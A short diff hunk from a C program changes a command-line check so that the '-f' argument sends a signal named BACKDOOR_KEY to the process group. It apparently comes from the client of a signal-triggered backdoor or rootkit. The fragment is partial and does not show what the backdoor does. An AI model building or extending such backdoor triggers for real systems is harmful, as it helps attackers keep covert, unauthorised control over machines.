@@ -47,7 +47,7 @@ int main(int argc, char*argv[]){
 		}
 	}else{
 		char* arg1 = argv[1];
-		if(strlen(arg1) == 1 && arg1[0] == 'f'){
+		if(strlen(arg1) == 2 && arg1[0] == '-' && arg1[1] == 'f'){
 			kill(0, BACKDOOR_KEY);
 			return 0;
 		}else{
